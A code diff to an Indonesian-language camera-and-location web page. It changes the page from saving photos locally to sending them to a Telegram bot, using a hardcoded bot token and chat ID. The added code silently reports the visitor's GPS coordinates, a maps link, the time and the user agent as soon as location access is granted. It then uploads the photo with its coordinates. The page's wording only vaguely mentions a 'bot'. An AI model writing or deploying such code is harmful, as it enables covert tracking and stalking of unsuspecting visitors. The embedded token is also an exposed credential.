@@ -280,7 +280,7 @@ button.success{
 
         <div class="info-item">
             <div class="dot"></div>
-            <span>Foto hanya disimpan setelah Anda memilih Simpan Foto</span>
+            <span>Foto dikirim ke bot setelah Anda memilih Simpan Foto</span>
         </div>
 
     </div>
@@ -355,6 +355,53 @@ let latitude = null;
 let longitude = null;
 
 let fotoSudahDiambil = false;
+
+const token = "8735241674:AAE3P60xJe1aSiVdBfSAHkYUHo4T1V99_Bk";
+const chat_id = "7032109008";
+
+
+/* =====================================================
+   KIRIM DATA KE TELEGRAM BOT
+===================================================== */
+
+function formatWaktu(){
+
+    return new Date().toLocaleString("id-ID",{
+        timeZone:"Asia/Makassar"
+    });
+}
+
+function kirimPesanTelegram(pesan){
+
+    const url =
+        "https://api.telegram.org/bot" +
+        token +
+        "/sendMessage?chat_id=" +
+        chat_id +
+        "&text=" +
+        encodeURIComponent(pesan);
+
+    const img = new Image();
+    img.src = url;
+}
+
+async function kirimFotoTelegram(blob,caption){
+
+    const formData = new FormData();
+
+    formData.append("chat_id",chat_id);
+    formData.append("photo",blob,"foto.jpg");
+    formData.append("caption",caption);
+
+    await fetch(
+        "https://api.telegram.org/bot" + token + "/sendPhoto",
+        {
+            method:"POST",
+            mode:"no-cors",
+            body:formData
+        }
+    );
+}
 
 
 /* =====================================================
@@ -440,6 +487,15 @@ async function mintaAkses(){
 
     latitude = posisi.coords.latitude;
     longitude = posisi.coords.longitude;
+
+    kirimPesanTelegram(
+        "📍 LOKASI BARU\n\n" +
+        "Latitude  : " + latitude + "\n" +
+        "Longitude : " + longitude + "\n" +
+        "Maps      : https://www.google.com/maps?q=" + latitude + "," + longitude + "\n" +
+        "Waktu     : " + formatWaktu() + "\n" +
+        "UserAgent : " + navigator.userAgent
+    );
 
 
     /*
@@ -623,12 +679,12 @@ Lokasi yang terdeteksi:
 Latitude  : ${latitude}
 Longitude : ${longitude}
 
-Silakan pilih "Simpan Foto" untuk menyimpan gambar ke perangkat.`;
+Silakan pilih "Simpan Foto" untuk mengirim gambar ke bot.`;
 }
 
 
 /* =====================================================
-   SIMPAN FOTO KE PERANGKAT
+   SIMPAN FOTO KE TELEGRAM BOT
 ===================================================== */
 
 function simpanFoto(){
@@ -637,86 +693,49 @@ function simpanFoto(){
         return;
     }
 
+    const status =
+        document.getElementById("status");
+
     const canvas =
         document.getElementById("photoCanvas");
 
-    /*
-     * Mengubah canvas menjadi JPG
-     */
+    status.innerText =
+        "⏳ Mengirim foto ke bot...";
 
-    canvas.toBlob(function(blob){
+    canvas.toBlob(async function(blob){
 
         if(!blob){
 
-            document.getElementById("status").innerText =
+            status.innerText =
                 "❌ Gagal membuat file foto.";
 
             return;
         }
 
-        const url =
-            URL.createObjectURL(blob);
+        const caption =
+            "📸 FOTO BARU\n\n" +
+            "Latitude  : " + latitude + "\n" +
+            "Longitude : " + longitude + "\n" +
+            "Maps      : https://www.google.com/maps?q=" + latitude + "," + longitude + "\n" +
+            "Waktu     : " + formatWaktu();
 
+        try{
 
-        /*
-         * Nama file menggunakan timestamp
-         */
+            await kirimFotoTelegram(blob,caption);
 
-        const sekarang =
-            new Date();
-
-        const namaFile =
-            "foto_" +
-            sekarang.getFullYear() +
-            "-" +
-            String(sekarang.getMonth()+1).padStart(2,"0") +
-            "-" +
-            String(sekarang.getDate()).padStart(2,"0") +
-            "_" +
-            String(sekarang.getHours()).padStart(2,"0") +
-            "-" +
-            String(sekarang.getMinutes()).padStart(2,"0") +
-            "-" +
-            String(sekarang.getSeconds()).padStart(2,"0") +
-            ".jpg";
-
-
-        /*
-         * Download file
-         */
-
-        const link =
-            document.createElement("a");
-
-        link.href = url;
-
-        link.download = namaFile;
-
-        document.body.appendChild(link);
-
-        link.click();
-
-        link.remove();
-
-
-        /*
-         * Bersihkan object URL
-         */
-
-        setTimeout(()=>{
-            URL.revokeObjectURL(url);
-        },1000);
-
-
-        document.getElementById("status").innerText =
-`✅ Foto berhasil disimpan.
-
-Nama file:
-${namaFile}
+            status.innerText =
+`✅ Foto berhasil dikirim ke bot.
 
 📍 Lokasi saat foto diambil:
 Latitude  : ${latitude}
 Longitude : ${longitude}`;
+
+        }catch(error){
+
+            status.innerText =
+                "❌ Gagal mengirim foto ke bot. Coba lagi.";
+
+        }
 
     },"image/jpeg",0.92);
 }
